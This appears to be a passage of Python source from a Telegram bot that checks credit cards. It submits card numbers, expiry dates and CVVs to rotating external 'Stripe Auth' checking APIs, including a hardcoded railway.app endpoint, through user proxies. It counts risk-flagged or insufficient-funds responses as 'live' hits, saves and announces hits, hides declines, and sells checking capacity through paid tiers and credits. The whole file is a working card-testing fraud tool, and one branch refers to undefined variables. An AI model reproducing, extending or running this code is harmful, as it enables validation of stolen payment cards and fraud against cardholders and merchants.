class AutoStripeAPIPool:
    """
    Auto Stripe Auth API Pool - Rotates between multiple Stripe Auth APIs
    This is for STRIPE AUTH gateway, NOT Shopify
    """
    
    def __init__(self, apis=None):
        if apis is None:
            apis = AUTO_STRIPE_API_POOL_CONFIG
        self.apis = apis
        self.api_stats = {}
        self._lock = asyncio.Lock()
        self.session = None
        
        # Initialize stats for each API
        for api in self.apis:
            self.api_stats[api["name"]] = {
                "total_requests": 0,
                "successful": 0,
                "failed": 0,
                "avg_response_time": 0,
                "last_used": 0,
                "enabled": api.get("enabled", True),
                "weight": api.get("weight", 1)
            }
        
        print(f"🔌 Auto Stripe Auth API Pool initialized with {len(self.apis)} APIs")
        for api in self.apis:
            print(f"   • {api['name']}: {api['url']}")
    
    async def get_session(self):
        """Get or create HTTP session"""
        if self.session is None or self.session.is_closed:
            timeout = httpx.Timeout(60.0, connect=15.0, read=50.0)
            self.session = httpx.AsyncClient(
                timeout=timeout,
                verify=False,
                limits=httpx.Limits(max_keepalive_connections=20, max_connections=50),
                http2=True
            )
        return self.session
    
    async def get_next_api(self) -> dict:
        """Get next enabled API using round-robin"""
        async with self._lock:
            enabled_apis = [api for api in self.apis if api.get("enabled", True)]
            
            if not enabled_apis:
                print("⚠️ All Auto Stripe Auth APIs disabled! Re-enabling all...")
                for api in self.apis:
                    api["enabled"] = True
                enabled_apis = self.apis.copy()
            
            # Round-robin selection
            for api in enabled_apis:
                if not hasattr(self, '_api_index'):
                    self._api_index = 0
                selected = enabled_apis[self._api_index % len(enabled_apis)]
                self._api_index = (self._api_index + 1) % len(enabled_apis)
                
                stats = self.api_stats.get(selected["name"], {})
                success_rate = (stats.get('successful', 0) / max(stats.get('total_requests', 1), 1)) * 100
                print(f"🔄 [Stripe Auth Pool] Selected: {selected['name']} (success: {success_rate:.0f}%)")
                return selected.copy()
            
            return enabled_apis[0].copy()
    
    def mark_api_result(self, api_name: str, success: bool, response_time: float, is_retryable: bool = False):
        """Mark API call result for statistics"""
        for api in self.apis:
            if api["name"] == api_name:
                if success:
                    api["success_count"] = api.get("success_count", 0) + 1
                    api["last_success"] = time.time()
                    api["weight"] = min(20, api.get("weight", 1) + 1)
                else:
                    api["fail_count"] = api.get("fail_count", 0) + 1
                    api["weight"] = max(0.5, api.get("weight", 1) - 0.5)
                
                # Update average response time
                old_avg = api.get("avg_response_time", 0)
                total_calls = api.get("success_count", 0) + api.get("fail_count", 0)
                if total_calls > 0:
                    api["avg_response_time"] = ((old_avg * (total_calls - 1)) + response_time) / total_calls
                
                # Auto-disable if 5 consecutive failures
                if api.get("fail_count", 0) >= 5 and api.get("success_count", 0) == 0:
                    print(f"⚠️ Disabling Stripe Auth API {api_name} due to 5 failures")
                    api["enabled"] = False
                break
        
        # Update stats dict
        if api_name in self.api_stats:
            self.api_stats[api_name]["total_requests"] += 1
            if success:
                self.api_stats[api_name]["successful"] += 1
            else:
                self.api_stats[api_name]["failed"] += 1
            
            old_avg = self.api_stats[api_name]["avg_response_time"]
            total = self.api_stats[api_name]["total_requests"]
            if total > 0:
                self.api_stats[api_name]["avg_response_time"] = ((old_avg * (total - 1)) + response_time) / total
    
    async def check_card_with_pool(self, card: str, site: str, amount: float = 1.00, 
                                    proxy: str = None, user_id: int = None) -> Dict:
        """
        Check a card using Stripe Auth API pool
        Returns: Dict with status, message, etc.
        """
        max_attempts = 3
        tried_apis = []
        
        for attempt in range(max_attempts):
            # Get a new API for each attempt
            api = await self.get_next_api()
            api_name = api["name"]
            
            if api_name in tried_apis:
                continue
            tried_apis.append(api_name)
            
            print(f"\n🔍 [Stripe Auth Pool] Attempt {attempt + 1}/{max_attempts} using: {api_name}")
            
            start_time = time.time()
            
            try:
                result = await self._make_api_request(api, card, site, amount, proxy)
                elapsed = time.time() - start_time
                
                if result is None:
                    self.mark_api_result(api_name, False, elapsed, True)
                    continue
                
                status_category = result.get("status_category", "unknown")
                
                # Any valid response (even declined) means API is working
                if status_category in ["charged", "approved", "declined"]:
                    self.mark_api_result(api_name, True, elapsed, False)
                    result["api_used"] = api_name
                    result["api_attempt"] = attempt + 1
                    print(f"✅ [Stripe Auth Pool] {api_name} returned: {status_category}")
                    return result
                else:
                    self.mark_api_result(api_name, False, elapsed, True)
                    continue
                
            except Exception as e:
                elapsed = time.time() - start_time
                self.mark_api_result(api_name, False, elapsed, True)
                print(f"❌ [Stripe Auth Pool] {api_name} error: {str(e)[:100]}")
                continue
        
        # All attempts failed
        return {
            "status": "error",
            "result": "ALL_APIS_FAILED",
            "message": "All Stripe Auth APIs failed",
            "status_display": "⚠️ ALL APIS FAILED",
            "status_category": "error",
            "elapsed": 0,
            "price": f"${amount:.2f}",
            "site": site,
            "gateway": "Stripe Auth"
        }
    
    async def _make_api_request(self, api: dict, card: str, site: str, amount: float, proxy: str = None) -> Dict:
        """Make request to a specific Stripe Auth API"""
        
        # Parse card
        parts = card.split('|')
        if len(parts) != 4:
            return None
        
        card_num, month, year, cvv = parts
        
        # Format year (API expects 2-digit year)
        if len(year) == 4:
            year_2digit = year[2:]
        else:
            year_2digit = year
        
        formatted_card = f"{card_num}|{month}|{year_2digit}|{cvv}"
        
        session = await self.get_session()
        
        try:
            # Build request based on API format
            if api.get("params_format") == "query":
                url = api["url"]
                params = {
                    "gateway": api.get("gateway", "autostripe"),
                    "key": api.get("key", "DemoKey"),
                    "site": site,
                    "cc": formatted_card
                }
                if amount:
                    params["amount"] = str(amount)
                
                print(f"📤 [Stripe Auth] GET {url}")
                print(f"📤 Params: site={site}, cc={formatted_card[:20]}...")
                
                response = await session.get(url, params=params)
                
            elif api.get("params_format") == "path":
                # Path format: /stripe/key=public/cc=xxx
                base_url = api["url"]
                full_url = f"{base_url}/cc={formatted_card}"
                print(f"📤 [Stripe Auth] GET {full_url}")
                response = await session.get(full_url)
            
            else:
                # Default format
                url = "http://web-production-6695b.up.railway.app/check"
                params = {
                    "gateway": "autostripe",
                    "key": "DemoKey",
                    "site": site,
                    "cc": formatted_card,
                    "amount": str(amount)
                }
                print(f"📤 [Stripe Auth] GET {url}")
                response = await session.get(url, params=params)
            
            elapsed = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
            print(f"📥 Response time: {elapsed:.2f}s | Status: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    print(f"📄 Response: {json.dumps(data, indent=2)[:500]}")
                    return self._parse_response(data, card, site, amount, elapsed)
                except json.JSONDecodeError as e:
                    print(f"⚠️ JSON parse error: {e}")
                    print(f"Raw response: {response.text[:200]}")
                    return None
            else:
                print(f"⚠️ HTTP {response.status_code}")
                return None
                
        except httpx.TimeoutException:
            print(f"⏰ Timeout")
            return None
        except Exception as e:
            print(f"❌ Request error: {e}")
            return None
    
    def _parse_response(self, data: dict, card: str, site: str, amount: float, elapsed: float) -> Dict:
        """Parse Stripe Auth API response - DETECTS ALL RESPONSE TYPES"""
        
        # Try different possible response field names
        api_status = data.get('status', data.get('result', data.get('Response', 'ERROR')))
        api_response = data.get('response', data.get('message', data.get('Message', 'Unknown')))
        
        # Handle nested response
        if isinstance(api_response, dict):
            api_response = api_response.get('message', str(api_response))
        
        api_upper = str(api_status).upper()
        response_upper = str(api_response).upper()
        
        print(f"📊 [PARSE] Status: {api_status}, Response: {api_response[:100]}")
        
        # ============ STRIPE AUTH SPECIFIC RESPONSES ============
        
        # NEW PAYMENT METHOD ADDED (Card is LIVE/Valid)
        if "NEW PAYMENT METHOD ADDED SUCCESSFULLY" in response_upper or "PAYMENT METHOD ADDED" in response_upper:
            status_display = "✅ NEW PAYMENT METHOD ADDED"
            status_category = "approved"
            print(f"✅ [STRIPE AUTH] New Payment Method Added - Card is LIVE!")
        
        # EXISTING_ACCOUNT_RESTRICTED (Card is LIVE but account restricted)
        elif "EXISTING_ACCOUNT_RESTRICTED" in response_upper:
            status_display = "✅ EXISTING ACCOUNT RESTRICTED"
            status_category = "approved"
            print(f"✅ [STRIPE AUTH] Existing Account Restricted - Card is LIVE!")
        
        # RISK_DISALLOWED (Card is LIVE but risk flagged)
        elif "RISK_DISALLOWED" in response_upper:
            status_display = "✅ RISK DISALLOWED"
            status_category = "approved"
            print(f"✅ [STRIPE AUTH] Risk Disallowed - Card is LIVE!")
        
        # APPROVED
        elif "APPROVED" in response_upper:
            status_display = "✅ APPROVED"
            status_category = "approved"
            print(f"✅ [STRIPE AUTH] Approved")
        
        # CARD DECLINED
        elif "YOUR CARD WAS DECLINED" in response_upper or "CARD DECLINED" in response_upper:
            status_display = "❌ CARD DECLINED"
            status_category = "declined"
            print(f"❌ [STRIPE AUTH] Card Declined")
        
        # INSUFFICIENT FUNDS
        elif "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
            status_display = "💰 INSUFFICIENT FUNDS"
            status_category = "approved"
            print(f"💰 [STRIPE AUTH] Insufficient Funds - Card is LIVE")
        
        # CVV LIVE
        elif "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
            status_display = "✅ CVV LIVE"
            status_category = "approved"
            print(f"✅ [STRIPE AUTH] CVV Live")
        
        # 3D/OTP REQUIRED
        elif any(p in response_upper for p in ["3D", "OTP", "SECURE", "AUTHENTICATION", "3DS"]):
            status_display = "🔐 3D REQUIRED"
            status_category = "approved"
            print(f"🔐 [STRIPE AUTH] 3D Required")
        
        # Your card number is incorrect
        elif "YOUR CARD NUMBER IS INCORRECT" in response_upper:
            status_display = "❌ INCORRECT CARD NUMBER"
            status_category = "declined"
            print(f"❌ [STRIPE AUTH] Incorrect Card Number")
        
        # Default - if we got a response, card was processed
        elif response_upper and len(response_upper) > 5:
            status_display = "✅ PROCESSED"
            status_category = "approved"
            print(f"✅ [STRIPE AUTH] Processed: {api_response[:50]}")
        
        else:
            status_display = "❌ UNKNOWN"
            status_category = "declined"
            print(f"❌ [STRIPE AUTH] Unknown response")
        
        # Get price
        price = data.get('price', data.get('amount', f"${amount:.2f}"))
        if isinstance(price, (int, float)):
            price = f"${price:.2f}"
        
        return {
            "status": "success" if status_category in ["charged", "approved"] else "declined",
            "result": api_status,
            "message": api_response,
            "status_display": status_display,
            "status_category": status_category,
            "elapsed": elapsed,
            "price": price,
            "site": site,
            "gateway": "Stripe Auth"
        }
    
    def get_stats(self) -> str:
        """Get formatted statistics for all APIs"""
        result = "📊 <b>Stripe Auth API Pool Statistics</b>\n\n"
        
        for api in self.apis:
            name = api["name"]
            stats = self.api_stats.get(name, {})
            enabled = "✅" if api.get("enabled", True) else "❌"
            total = stats.get('total_requests', 0)
            successful = stats.get('successful', 0)
            failed = stats.get('failed', 0)
            success_rate = (successful / max(total, 1)) * 100
            
            result += f"{enabled} <b>{name}</b>\n"
            result += f"   ├─ Requests: {total}\n"
            result += f"   ├─ Success Rate: {success_rate:.1f}%\n"
            result += f"   ├─ Successful: {successful}\n"
            result += f"   ├─ Failed: {failed}\n"
            result += f"   ├─ Avg Time: {stats.get('avg_response_time', 0):.2f}s\n"
            result += f"   └─ Weight: {api.get('weight', 1):.1f}\n\n"
        
        return result
    
    async def close(self):
        """Close HTTP session"""
        if self.session:
            await self.session.aclose()
            self.session = None


# Create global instance
auto_stripe_api_pool = AutoStripeAPIPool()

# ============ AUTO STRIPE SINGLE CHECK COMMAND ============
async def single_check_auto_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Auto Stripe gateway - /chk with credit system"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    username = update.effective_user.username or update.effective_user.first_name
    
    # Parse arguments
    if len(context.args) == 1:
        card_text = context.args[0]
        site = auto_stripe_site_manager.get_site_for_user(user_id)
        if not site:
            await message.reply_text("❌ No default sites configured.\n\nUse /setautosite <site> to set your preferred site.")
            return
    elif len(context.args) >= 2:
        site = context.args[0].strip().lower()
        site = site.replace('http://', '').replace('https://', '').split('/')[0]
        card_text = " ".join(context.args[1:]).strip()
    else:
        await message.reply_text(
            "❌ Invalid usage.\n\n"
            "Usage:\n"
            "• /chk <card> (uses your saved site)\n"
            "• /chk <site> <card>\n\n"
            "Example: /chk dilaboards.com 4242424242424242|12|2028|123"
        )
        return
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await message.reply_text("❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV")
        return
    
    # ============ CREDIT CHECK FIRST - STOP IF NO CREDITS ============
    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    # Check gateway access
    if not user_manager.can_access_gateway(user_id, 'auto_stripe'):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f" USE /buy TO UPGRADE YOUR TIER 💎\n"
            
        )
        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
        add_user_credits(u_id, 1)
        return
    
    auto_stripe_active_tasks[user_id] = True
    
    try:
        tier = user_manager.get_tier(user_id)
        if user_id not in user_speed_controllers:
            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[user_id]
        
        status_msg = await message.reply_text(f"🔄 Checking...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        proxy_str = get_proxy_for_user(user_id) if user_manager.can_use_proxy(user_id) else None
        result = await check_card_auto_stripe(card, site, "autostripe", AUTO_STRIPE_API_KEY, proxy_str)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        if result.get("status_category") == "approved":
            auto_stripe_site_manager.record_site_result(site, True)
        else:
            auto_stripe_site_manager.record_site_result(site, False)
        
        bin_info = await get_bin_info(card)
        
        # ============ DEBUG: Print what we're about to send ============
        print(f"\n🔔 [AUTO STRIPE DEBUG] About to send result to user {user_id}")
        print(f"🔔 [AUTO STRIPE DEBUG] Card: {card}")
        print(f"🔔 [AUTO STRIPE DEBUG] Status: {result.get('status_category', 'unknown')}")
        print(f"🔔 [AUTO STRIPE DEBUG] Response: {result.get('message', '')[:100]}")
        # ================================================================
        
        # Format response for display
        ui, status_category = format_auto_stripe_response(result, card, bin_info)
        
        # ============ ALWAYS SEND THE RESULT TO USER ============
        try:
            await status_msg.delete()
        except:
            pass
        
        # Send the result to user
        await message.reply_text(ui, parse_mode=ParseMode.HTML)
        print(f"✅ [AUTO STRIPE DEBUG] Result sent to user {user_id}")
        print(f"📤 [AUTO STRIPE DEBUG] Message content: {ui[:200]}...")
        # =========================================================
        
        # Send GIF and hit notification for approved/charged cards
        status_category = result.get("status_category", "unknown")
        response_msg = result.get("message", "")
        
        if status_category in ["approved", "charged"] or is_hit_response(response_msg)[0]:
            print(f"🎯 [AUTO STRIPE DEBUG] This is a HIT! Sending GIF and notifications...")
            
            await send_gif_with_result_combined(
                update=update,
                context=context,
                card=card,
                gateway="auto_stripe",
                response=response_msg,
                price="N/A",
                bin_info=bin_info,
                status_category="charged",
                username=username
            )
            
            await save_hit_to_file(
                card=card, gateway="Auto Stripe",
                response=response_msg, price="N/A",
                bin_info=bin_info, user_id=user_id, user_tier=tier
            )
            
            user_data = user_manager.get_user(user_id)
            await send_hit_notification(
                context=context, gateway="Auto Stripe", card=card,
                response=response_msg, price="N/A",
                user=user_data, bin_info=bin_info, status_category="approved"
            )
            
            user_manager.increment_hits(user_id)
        else:
            print(f"ℹ️ [AUTO STRIPE DEBUG] Not a hit - result sent to user only")
        
        user_manager.increment_checks(user_id)
        
        # Show remaining credits for free users
        tier_check = user_manager.get_tier(user_id)
        if tier_check == 'free':
            remaining = get_user_credits(user_id)
            await message.reply_text(
                f"💎 <b>Credits Remaining: {remaining}</b>\n"
                f"Use /credits to check balance.",
                parse_mode=ParseMode.HTML
            )
        
    except Exception as e:
        print(f"❌ [AUTO STRIPE DEBUG] Error: {e}")
        print(f"❌ [AUTO STRIPE DEBUG] Traceback: {traceback.format_exc()}")
        try:
            await status_msg.delete()
        except:
            pass
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        # Refund credits on error
        add_user_credits(user_id, 1)
    finally:
        auto_stripe_active_tasks.pop(user_id, None)
        print(f"🏁 [AUTO STRIPE DEBUG] Session ended for user {user_id}")
        

# ============ AUTO STRIPE MASS CHECK WITH API POOL ============
async def auto_stripe_mass_check_with_pool(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                                            cards: list, site: str = None, progress_msg=None):
    """
    Mass check for Auto Stripe Auth using API pool with parallel processing
    ONLY SHOWS APPROVED CARDS (New Payment Method Added Successfully)
    HIDES DECLINED CARDS from appearing in chat
    """
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    # Ensure site is not None
    if site is None:
        site = auto_stripe_site_manager.get_site_for_user(u_id)
        if not site:
            default_sites = auto_stripe_site_manager.get_default_sites_list()
            if default_sites:
                site = default_sites[0]
                print(f"📦 [Stripe Auth Mass] Using default site: {site}")
            else:
                await message.reply_text(
                    "❌ No site configured for Stripe Auth.\n\n"
                    "Please set a site first using:\n"
                    "<code>/setautosite &lt;site&gt;</code>",
                    parse_mode=ParseMode.HTML
                )
                return
    
    print(f"\n{'='*80}")
    print(f"🚀 [STRIPE AUTH MASS CHECK] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"📍 Site: {site}")
    print(f"{'='*80}")
    
    amount = float(context.user_data.get('payment_amount', DEFAULT_AMOUNT))
    
    stats = {
        "approved": 0,
        "declined": 0,
        "errors": 0,
        "total": total,
        "processed": 0,
        "api_usage": {}
    }
    
    start_time = time.time()
    
    try:
        auto_stripe_active_tasks[u_id] = True
        
        tier = user_manager.get_tier(u_id)
        
        CONCURRENCY = {
            "free": 2,
            "premium": 5,
            "ultimate": 5,
            "admin": 5,
        }.get(tier, 2)
        
        if progress_msg is None:
            progress_text = (
                f"<b>Gateway</b> ➛ Stripe Auth \n"
                f"<b>Status</b> ➛ STARTING...\n"
                f"<b>Checked</b> ➛ 0/{total}\n"
                f"<b>Approved</b> ➛ 0\n"
                f"<b>Declined</b> ➛ 0 (Hidden)\n"
                f"<b>Errors</b> ➛ 0\n"
                f"<b>Time</b> ➛ 0s"
            )
            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
        
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        stats_lock = asyncio.Lock()
        processed_count = 0
        
        async def update_progress(current: int):
            """Update progress message"""
            if current > 0 and current < total and current % 5 != 0:
                return
            elapsed = int(time.time() - start_time)
            minutes = elapsed // 60
            seconds = elapsed % 60
            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
            
            progress_text = (
                f"<b>Gateway</b> ➛ Stripe Auth \n"
                f"<b>Status</b> ➛ PROCESSING {current}/{total}\n"
                f"<b>Checked</b> ➛ {current}/{total}\n"
                f"<b>Approved</b> ➛ {stats['approved']}\n"
                f"<b>Declined</b> ➛ {stats['declined']} \n"
                f"<b>Errors</b> ➛ {stats['errors']}\n"
                f"<b>Time</b> ➛ {time_str}"
            )
            try:
                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except:
                pass
        
        async def process_single_card(card: str, idx: int):
            """Process a single card - ONLY SHOW APPROVED CARDS"""
            nonlocal processed_count
            
            # Add small random delay to avoid rate limiting
            await asyncio.sleep(random.uniform(0.1, 0.5))
            
            async with semaphore:
                await speed_controller.wait_if_needed()
                start = time.time()
                
                # Get proxy if allowed
                proxy_str = None
                if user_manager.can_use_proxy(u_id):
                    if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
                        proxy_list = autosopi_proxy_tracker.working_proxies[u_id]
                        if proxy_list:
                            proxy_index = idx % len(proxy_list)
                            proxy_str = proxy_list[proxy_index]
                
                # Check using API pool
                result = await auto_stripe_api_pool.check_card_with_pool(card, site, amount, proxy_str, u_id)
                elapsed = time.time() - start
                speed_controller.record_response(elapsed)
                
                # Get BIN info
                bin_info = await get_bin_info(card)
                
                # Get response message
                response_msg = result.get("message", "")
                status_category = result.get("status_category", "unknown")
                api_used = result.get("api_used", "unknown")
                
                # ============ DETERMINE IF CARD IS APPROVED ============
                is_approved = False
                response_upper = response_msg.upper()
                
                # Check for approved patterns
                if "NEW PAYMENT METHOD ADDED SUCCESSFULLY" in response_upper:
                    is_approved = True
                    print(f"✅ [APPROVED] {card[:20]}... - New Payment Method Added")
                elif "EXISTING_ACCOUNT_RESTRICTED" in response_upper:
                    is_approved = True
                    print(f"✅ [APPROVED] {card[:20]}... - Account Restricted (LIVE)")
                elif "RISK_DISALLOWED" in response_upper:
                    is_approved = True
                    print(f"✅ [APPROVED] {card[:20]}... - Risk Disallowed (LIVE)")
                elif "APPROVED" in response_upper and "DECLINED" not in response_upper:
                    is_approved = True
                    print(f"✅ [APPROVED] {card[:20]}... - Approved")
                elif "INSUFFICIENT FUNDS" in response_upper:
                    is_approved = True
                    print(f"💰 [APPROVED] {card[:20]}... - Insufficient Funds (LIVE)")
                elif "CVV LIVE" in response_upper:
                    is_approved = True
                    print(f"✅ [APPROVED] {card[:20]}... - CVV Live")
                else:
                    # Declined card - will be hidden
                    print(f"❌ [DECLINED - HIDDEN] {card[:20]}... - {response_msg[:50]}")
                
                # Update stats
                async with stats_lock:
                    processed_count += 1
                    
                    if api_used not in stats["api_usage"]:
                        stats["api_usage"][api_used] = 0
                    stats["api_usage"][api_used] += 1
                    
                    if is_approved:
                        stats["approved"] += 1
                    elif status_category == "declined" or not is_approved:
                        stats["declined"] += 1
                    else:
                        stats["errors"] += 1
                    
                    if processed_count % 5 == 0 or processed_count == total:
                        await update_progress(processed_count)
                
                # ============ ONLY SEND RESULT IF CARD IS APPROVED ============
                if is_approved:
                    ui, _ = format_auto_stripe_response(result, card, bin_info)
                    try:
                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
                        print(f"📤 [SENT] Approved card: {card[:20]}...")
                    except Exception as e:
                        print(f"❌ Error sending result: {e}")
                    
                    # Save hit to file for approved cards
                    await save_hit_to_file(
                        card=card, gateway="Stripe Auth",
                        response=response_msg,
                        price=result.get("price", f"${amount:.2f}"),
                        bin_info=bin_info, user_id=u_id, user_tier=tier
                    )
                
                user_manager.increment_checks(u_id, 1)
                return result, card, is_approved
        
        # Process all cards
        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
        
        # Use as_completed for real-time results
        for coro in asyncio.as_completed(tasks):
            if u_id not in auto_stripe_active_tasks:
                print(f"🛑 Session stopped for user {u_id}")
                break
            try:
                await coro
            except Exception as e:
                print(f"❌ Task error: {e}")
                async with stats_lock:
                    stats["errors"] += 1
        
        # Final summary
        if u_id in auto_stripe_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            
            # Build API usage summary
            api_summary = ""
            if stats["api_usage"]:
                api_summary = "\n📊 <b>API Usage:</b>\n"
                for api_name, count in sorted(stats["api_usage"].items(), key=lambda x: x[1], reverse=True):
                    api_summary += f"   • {api_name}: {count} cards\n"
            
            summary = (
                f" <b>Stripe Auth Mass Check Complete</b>\n\n"
                f"✅ Approved: {stats['approved']}\n"
                f"❌ Declined: {stats['declined']} \n"
                f"⚠️ Errors: {stats['errors']}\n"
                f"📝 Total: {total}\n"
                f"⏱️ Time: {minutes}m {seconds}s"
            )
            
            # Update final progress
            await update_progress(total)
            await message.reply_text(summary, parse_mode=ParseMode.HTML)
            print(f"📊 Final summary sent to user {u_id}")
        
        return stats
        
    except Exception as e:
        print(f"❌ Stripe Auth mass check error: {e}")
        traceback.print_exc()
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
            else:
                await message.reply_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        auto_stripe_active_tasks.pop(u_id, None)
        print(f"🏁 [Stripe Auth Mass] Session ended for user {u_id}")
        
        
        
